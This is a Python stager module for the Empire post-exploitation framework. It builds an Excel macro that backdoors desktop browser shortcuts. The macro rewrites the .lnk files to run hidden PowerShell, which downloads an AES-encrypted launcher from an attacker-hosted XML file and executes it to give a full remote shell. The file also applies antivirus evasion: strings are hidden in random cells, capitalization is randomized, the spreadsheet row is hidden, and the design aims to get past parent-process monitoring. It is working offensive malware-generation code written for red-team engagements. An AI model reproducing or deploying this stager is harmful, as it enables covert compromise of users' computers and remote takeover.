import random, string, xlrd, datetime
from xlutils.copy import copy
from xlwt import Workbook, Utils
from lib.common import helpers
from Crypto.Cipher import AES

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BackdoorLnkMacro',

            'Author': ['@G0ldenGunSec'],

            'Description': ('Generates a macro that backdoors .lnk files on the users desktop, backdoored lnk files in turn attempt to download & execute an empire launcher when the user clicks on them. Usage: Three files will be spawned from this, an xls document (either new or containing existing contents) that data will be placed into, a macro that should be placed in the spawned xls document, and an xml that should be placed on a web server accessible by the remote system (as defined during stager generation).  By default this xml is written to /var/www/html, which is the webroot on debian-based systems such as kali.'),

            'Comments': ['Two-stage macro attack vector used for bypassing tools that perform monitor parent processes and flag / block process launches from unexpected programs, such as office. The initial run of the macro is vbscript and spawns no child processes, instead it backdoors targeted shortcuts on the users desktop to do a direct run of powershell next time they are clicked.  The second step occurs when the user clicks on the shortcut, the powershell download stub that runs will attempt to download & execute an empire launcher from an xml file hosted on a pre-defined webserver, which will in turn grant a full shell.  Credits to @harmJ0y and @enigma0x3 for designing the macro stager that this was originally based on, @subTee for research pertaining to the xml.xmldocument cradle, and @curi0usJack for info on using cell embeds to evade AV.']
        }
	#random name our xml will default to in stager options
	xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(5,9)))

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the launcher to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
	    'TargetEXEs' : {
                'Description'   :   'Will backdoor .lnk files pointing to selected executables (do not include .exe extension), enter a comma seperated list of target exe names - ex. iexplore,firefox,chrome',
                'Required'      :   True,
                'Value'         :   'iexplore,firefox,chrome'
            },
            'XmlUrl' : {
                'Description'   :   'remotely-accessible URL to access the XML containing launcher code. Please try and keep this URL short, as it must fit in the given 1024 chars for args along with all other logic - default options typically allow for 100-200 chars of extra space, depending on targeted exe',
                'Required'      :   True,
                'Value'         :   "http://" + helpers.lhost() + "/"+xmlVar+".xml"
            },
            'XlsOutFile' : {
                'Description'   :   'XLS (incompatible with xlsx/xlsm) file to output stager payload to. If document does not exist / cannot be found a new file will be created',
                'Required'      :   True,
                'Value'         :   '/tmp/default.xls'
            },
            'OutFile' : {
                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/macro'
            },
	    'XmlOutFile' : {
                'Description'   :   'Local path + file to output xml to.',
                'Required'      :   True,
                'Value'         :   '/var/www/html/'+xmlVar+'.xml'
            },
	    'KillDate' : {
                'Description'   :   'Date after which the initial powershell stub will no longer attempt to download and execute code, set this for the end of your campaign / engagement. Format mm/dd/yyyy',
                'Required'      :   True,
                'Value'         :   datetime.datetime.now().strftime("%m/%d/%Y")
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other) (2nd stage).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other) (2nd stage).',
                'Required'      :   False,
                'Value'         :   'default'
            },
 	    'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting (2nd stage).',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other) (2nd stage).',
                'Required'      :   False,
                'Value'         :   'default'
            }

        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    #function to convert row + col coords into excel cells (ex. 30,40 -> AE40)
    @staticmethod
    def coordsToCell(row,col):
	coords = ""
	if((col) // 26 > 0):
		coords = coords + chr(((col)//26)+64)
	if((col + 1) % 26 > 0):
		coords = coords + chr(((col + 1) % 26)+64)
	else:
		coords = coords + 'Z'
	coords = coords + str(row+1)
	return coords

    def generate(self):
	# extract all of our options
	language = self.options['Language']['Value']
	listenerName = self.options['Listener']['Value']
	userAgent = self.options['UserAgent']['Value']
	proxy = self.options['Proxy']['Value']
	proxyCreds = self.options['ProxyCreds']['Value']
	stagerRetries = self.options['StagerRetries']['Value']
	targetEXE = self.options['TargetEXEs']['Value']	
	xlsOut = self.options['XlsOutFile']['Value']
	XmlPath = self.options['XmlUrl']['Value']
	XmlOut = self.options['XmlOutFile']['Value']
	#catching common ways date is incorrectly entered
	killDate = self.options['KillDate']['Value'].replace('\\','/').replace(' ','').split('/')
	if(int(killDate[2]) < 100):
		killDate[2] = int(killDate[2]) + 2000
	targetEXE = targetEXE.split(',')
	targetEXE = filter(None,targetEXE)

	#set vars to random alphabetical / alphanumeric values
	shellVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
	lnkVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
	fsoVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
	folderVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
	fileVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
	encKey = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation, random.randint(16,16)))
	#avoiding potential escape characters in our decryption key for the second stage payload
	for ch in ["\"","'","`"]:
		if ch in encKey:
			encKey = encKey.replace(ch,random.choice(string.ascii_lowercase))
	encIV = random.randint(1,240)

        # generate the launcher
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
	launcher = launcher.replace("\"","'")
	
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
	    try:
	    	reader = xlrd.open_workbook(xlsOut)
	   	workBook = copy(reader)
	    	activeSheet = workBook.get_sheet(0)
	    except (IOError, OSError):
		workBook = Workbook()
		activeSheet = workBook.add_sheet('Sheet1')

	    #sets initial coords for writing data to
	    inputRow = random.randint(50,70)
	    inputCol = random.randint(40,60)

	    #build out the macro - first take all strings that would normally go into the macro and place them into random cells, which we then reference in our macro
            macro = "Sub Auto_Close()\n"
	
	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("Wscript.shell"))
	    macro += "Set " + shellVar + " = CreateObject(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)\n"
	    inputCol = inputCol + random.randint(1,4)

	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("Scripting.FileSystemObject"))
	    macro += "Set "+ fsoVar + " = CreateObject(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)\n"
	    inputCol = inputCol + random.randint(1,4)

	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("desktop"))
	    macro += "Set " + folderVar + " = " + fsoVar + ".GetFolder(" + shellVar + ".SpecialFolders(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value))\n"	
	    macro += "For Each " + fileVar + " In " + folderVar + ".Files\n"

	    macro += "If(InStr(Lcase(" + fileVar + "), \".lnk\")) Then\n"
	    macro += "Set " + lnkVar + " = " + shellVar + ".CreateShortcut(" + shellVar + ".SPecialFolders(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value) & \"\\\" & " + fileVar + ".name)\n"
	    inputCol = inputCol + random.randint(1,4)
	
	    macro += "If("
	    for i, item in enumerate(targetEXE):
		if i:
			macro += (' or ')
		activeSheet.write(inputRow,inputCol,targetEXE[i].strip().lower()+".")
		macro += "InStr(Lcase(" + lnkVar + ".targetPath), activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)"
		inputCol = inputCol + random.randint(1,4)
	    macro += ") Then\n"
	    #launchString contains the code that will get insterted into the backdoored .lnk files, it will first launch the original target exe, then clean up all backdoors on the desktop.  After cleanup is completed it will check the current date, if it is prior to the killdate the second stage will then be downloaded from the webserver selected during macro generation, and then decrypted using the key and iv created during this same process.  This code is then executed to gain a full agent on the remote system.
	    launchString1 = "hidden -nop -c \"Start(\'"
	    launchString2 = ");$u=New-Object -comObject wscript.shell;gci -Pa $env:USERPROFILE\desktop -Fi *.lnk|%{$l=$u.createShortcut($_.FullName);if($l.arguments-like\'*xml.xmldocument*\'){$s=$l.arguments.IndexOf(\'\'\'\')+1;$r=$l.arguments.Substring($s, $l.arguments.IndexOf(\'\'\'\',$s)-$s);$l.targetPath=$r;$l.Arguments=\'\';$l.Save()}};$b=New-Object System.Xml.XmlDocument;if([int](get-date -U "
	    launchString3 = ") -le " + str(killDate[2]) + str(killDate[0]) + str(killDate[1]) + "){$b.Load(\'" 
	    launchString4 = "\');$a=New-Object 'Security.Cryptography.AesManaged';$a.IV=(" + str(encIV) + ".." + str(encIV + 15) + ");$a.key=[text.encoding]::UTF8.getBytes('" 
	    launchString5 = "');$by=[System.Convert]::FromBase64String($b.main);[Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($by,0,$by.Length)).substring(16)|iex}\""

	    #part of the macro that actually modifies the LNK files on the desktop, sets icon location for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
	    macro += lnkVar + ".IconLocation = " + lnkVar + ".targetpath\n"
	    launchString1 = helpers.randomize_capitalization(launchString1)
	    launchString2 = helpers.randomize_capitalization(launchString2)
	    launchString3 = helpers.randomize_capitalization(launchString3)
	    launchString4 = helpers.randomize_capitalization(launchString4)
	    launchString5 = helpers.randomize_capitalization(launchString5)
	    launchStringSum = launchString2 + "'%Y%m%d'" + launchString3 + XmlPath + launchString4 + encKey + launchString5

	    activeSheet.write(inputRow,inputCol,launchString1)
	    launch1Coords = self.coordsToCell(inputRow,inputCol) 
	    inputCol = inputCol + random.randint(1,4)
	    activeSheet.write(inputRow,inputCol,launchStringSum)
	    launchSumCoords = self.coordsToCell(inputRow,inputCol)
	    inputCol = inputCol + random.randint(1,4)

	    macro += lnkVar + ".arguments = \"-w \" & activeSheet.Range(\""+ launch1Coords +"\").Value & " + lnkVar + ".targetPath" + " & \"'\" & activeSheet.Range(\""+ launchSumCoords +"\").Value" + "\n"

	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization(":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
	    macro += lnkVar + ".targetpath = left(CurDir, InStr(CurDir, \":\")-1) & activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value\n"
	    inputCol = inputCol + random.randint(1,4)
	    #macro will not write backdoored lnk file if resulting args will be > 1024 length (max arg length) - this is to avoid an incomplete statement that results in a powershell error on run, which causes no execution of any programs and no cleanup of backdoors
	    macro += "if(Len(" + lnkVar + ".arguments) < 1023) Then\n"
	    macro += lnkVar + ".save\n"
	    macro += "end if\n"
	    macro += "end if\n"
	    macro += "end if\n"
	    macro += "next " + fileVar + "\n"
	    macro += "End Sub\n"
	    activeSheet.row(inputRow).hidden = True 
	    print helpers.color("\nWriting xls...\n", color="blue")
	    workBook.save(xlsOut)
	    print helpers.color("xls written to " + xlsOut + "  please remember to add macro code to xls prior to use\n\n", color="green")


	    #encrypt the second stage code that will be dropped into the XML - this is the full empire stager that gets pulled once the user clicks on the backdoored shortcut
	    ivBuf = ""
	    for z in range(0,16):
		ivBuf = ivBuf + chr(encIV + z)
	    encryptor = AES.new(unicode(encKey, "utf-8"), AES.MODE_CBC, ivBuf)
	    launcher = unicode(launcher,"utf-8")
	    #pkcs7 padding - aes standard on Windows - if this padding mechanism is used we do not need to define padding in our macro code, saving space
	    padding = 16-(len(launcher) % 16)
	    if padding == 0:
		launcher = launcher + ('\x00'*16)
	    else:
		launcher = launcher + (chr(padding)*padding)

	    cipher_text = encryptor.encrypt(launcher)
	    cipher_text = helpers.encode_base64(ivBuf+cipher_text)

	    #write XML to disk
	    print helpers.color("Writing xml...\n", color="blue")
	    fileWrite = open(XmlOut,"w")
	    fileWrite.write("<?xml version=\"1.0\"?>\n")
	    fileWrite.write("<main>")
	    fileWrite.write(cipher_text)
	    fileWrite.write("</main>\n")
	    fileWrite.close()
	    print helpers.color("xml written to " + XmlOut + " please remember this file must be accessible by the target at this url: " + XmlPath + "\n", color="green")

            return macro
